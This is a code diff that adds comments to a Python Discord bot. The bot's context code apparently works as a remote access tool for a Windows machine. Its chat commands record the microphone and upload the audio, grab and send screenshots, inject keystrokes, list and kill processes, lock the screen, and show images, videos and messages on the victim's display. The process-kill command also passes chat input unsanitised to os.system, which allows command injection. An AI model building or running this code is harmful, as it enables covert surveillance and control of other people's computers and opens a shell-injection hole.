@@ -79,20 +79,20 @@ class MyClient(discord.Client):
                 subprocess.run(['ffmpeg', '-f', 'dshow', '-i', f'audio={mic}', '-t', f'{time}', 'output.wav'])
                 await message.channel.send(file=discord.File('output.wav'))
                 os.remove('output.wav')
-            
+            #update the application   
             if f'{message.content}' == 'upd':
 
                 await message.channel.send('Updating...')
                 os.startfile(str(path))
                 quit()
-
+            #take a screenshot
             if f'{message.content}' == 'scr':
                 # Take screenshot
                 im = ImageGrab.grab()
                 im.save('screenshot.png')
                 await message.channel.send(file=discord.File('screenshot.png'))
                 os.remove('screenshot.png')
-
+            #text to speech
             if f'{message.content}' == 'tts':
                 # Check if the message is from the bot itself
                 if message.author == self.user:
@@ -117,7 +117,7 @@ class MyClient(discord.Client):
                     os.remove("msg.mp3")
 
                 await Playsound()
-
+            #display a message box
             if f'{message.content}' == 'msg':  
                 #wait for reply containing the user defined message in discord
                 await message.channel.send('Please enter the message you would like to send')
@@ -136,12 +136,12 @@ class MyClient(discord.Client):
                 t2 = Thread(target=Dialog_Box)
                 t2.start()
                 t2.join()
-
+            #lock the screen
             if f'{message.content}' == 'lock': 
                 # Lock the screen
                 os.system("rundll32.exe user32.dll,LockWorkStation")
                 await message.channel.send('Screen Locked')
-
+            #send keystrokes
             if f'{message.content}' == 'key':
                 await message.channel.send('Please enter the keystrokes you would like to send')
                 def check(m):
@@ -149,7 +149,7 @@ class MyClient(discord.Client):
                 msg = await client.wait_for('message', check=check)
                 pyautogui.typewrite(msg.content)
                 await message.channel.send('Keystrokes sent')
-
+            #close a process
             if f'{message.content}' == 'close':
                 #send a list of proccesses to discord chat
                 os.system('tasklist > tasklist.txt')
@@ -161,7 +161,7 @@ class MyClient(discord.Client):
                 msg = await client.wait_for('message', check=check)
                 await message.channel.send(f'Closing {msg.content}')
                 os.system(f'taskkill /f /im {msg.content}')
-            
+            #show an image for half a second on screen
             if f'{message.content}' == 'img':
                  await message.channel.send('Please upload the image you would like to display')
                  def check(m):
@@ -187,7 +187,7 @@ class MyClient(discord.Client):
                  show_image()
                  print("Image should have been displayed")
                  os.remove('temp_image.png')
-                
+            #play a vid on screen with no audio   
             if f'{message.content}' == 'vid':
                 await message.channel.send('Please upload the video you would like to display')
                 def check(m):
@@ -261,7 +261,7 @@ class MyClient(discord.Client):
                 volume_interface.SetMasterVolumeLevelScalar(volume, None)
 
                 await message.channel.send(f'Volume set to {msg.content}%')
-
+            #display a user defined message
             if f'{message.content}' == 'help':
                 help_message = (
                     "Available commands:\n"
